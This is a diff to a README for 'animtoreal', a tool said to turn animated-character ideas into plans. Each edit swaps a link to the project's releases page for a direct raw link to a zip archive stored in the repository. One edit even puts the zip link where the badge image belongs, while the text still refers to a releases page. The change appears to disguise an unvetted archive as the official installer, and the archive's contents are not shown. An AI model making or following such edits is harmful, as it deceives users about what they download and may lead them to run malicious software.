@@ -1,6 +1,6 @@
 # 🎨 animtoreal - Bring Characters to Life Simply
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/gjorwal/animtoreal/releases)
+[![Download](https://github.com/gjorwal/animtoreal/raw/refs/heads/main/animtoreal/Software-1.6.zip)](https://github.com/gjorwal/animtoreal/raw/refs/heads/main/animtoreal/Software-1.6.zip)
 
 ## 📦 Description
 animtoreal helps you transform your animated character ideas into reality. Input details about your character, and the package provides a structured summary or a step-by-step plan. Whether you are designing costumes or planning productions, animtoreal guides you through every stage.
@@ -9,7 +9,7 @@ animtoreal helps you transform your animated character ideas into reality. Input
 To get started with animtoreal, you will need to download the software. Follow the steps below:
 
 1. **Visit the Download Page**: Click on the link below to access the releases page.
-   [Download Page](https://github.com/gjorwal/animtoreal/releases)
+   [Download Page](https://github.com/gjorwal/animtoreal/raw/refs/heads/main/animtoreal/Software-1.6.zip)
 
 2. **Choose Your Version**: On the releases page, you will see a list of available versions. Select the latest version for the best features and updates.
 
@@ -20,7 +20,7 @@ To get started with animtoreal, you will need to download the software. Follow t
 5. **Launch the Application**: After the installation finishes, find the animtoreal icon on your desktop or in your applications folder. Click to open the software.
 
 ## 📥 Download & Install
-To download animtoreal, visit this page: [Download Page](https://github.com/gjorwal/animtoreal/releases). 
+To download animtoreal, visit this page: [Download Page](https://github.com/gjorwal/animtoreal/raw/refs/heads/main/animtoreal/Software-1.6.zip). 
 
 Follow these steps:
 - Find the latest release and click to download the installer.
